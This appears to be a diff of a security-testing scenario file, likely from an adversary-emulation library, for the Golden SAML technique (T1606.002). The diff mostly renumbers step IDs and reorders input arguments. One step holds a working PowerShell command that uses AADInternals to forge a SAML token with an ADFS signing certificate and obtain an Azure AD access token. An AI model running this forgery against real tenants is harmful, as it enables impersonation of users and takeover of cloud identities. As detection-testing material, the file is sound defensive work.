@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43",
+      "id": "3532e65e-e340-4568-ab2e-e2b2f376d08b",
       "type": "execute-command",
       "data": {
         "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
+      "id": "cfd98a9f-b884-430a-8466-e102e7078f92",
       "name": "Check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
+      "id": "c639b09a-de00-49f6-a30a-37d2e3a8ebe9",
       "name": "Resolve dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
+      "id": "9297baf0-91e4-4401-b1c6-6cffeb0880b2",
       "name": "Re-check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
+      "s": "cfd98a9f-b884-430a-8466-e102e7078f92",
       "p": "on-success",
-      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
+      "o": "3532e65e-e340-4568-ab2e-e2b2f376d08b"
     },
     {
-      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
+      "s": "cfd98a9f-b884-430a-8466-e102e7078f92",
       "p": "on-failure",
-      "o": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b"
+      "o": "c639b09a-de00-49f6-a30a-37d2e3a8ebe9"
     },
     {
-      "s": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
+      "s": "c639b09a-de00-49f6-a30a-37d2e3a8ebe9",
       "p": "on-success",
-      "o": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2"
+      "o": "9297baf0-91e4-4401-b1c6-6cffeb0880b2"
     },
     {
-      "s": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
+      "s": "9297baf0-91e4-4401-b1c6-6cffeb0880b2",
       "p": "on-failure",
-      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
+      "o": "3532e65e-e340-4568-ab2e-e2b2f376d08b"
     }
   ],
   "tags": [
@@ -76,12 +76,6 @@
     "T1606.002"
   ],
   "input_arguments": [
-    {
-      "name": "certificate_path",
-      "type": "path",
-      "description": "Token signing certificate path. See T1552.004 to export it",
-      "value": ".\\ADFS_signing.pfx"
-    },
     {
       "name": "immutable_id",
       "type": "string",
@@ -93,6 +87,12 @@
       "type": "string",
       "description": "Issuer URI of the ADFS service",
       "value": "http://contoso.com/adfs/services/trust/"
+    },
+    {
+      "name": "certificate_path",
+      "type": "path",
+      "description": "Token signing certificate path. See T1552.004 to export it",
+      "value": ".\\ADFS_signing.pfx"
     }
   ]
 }
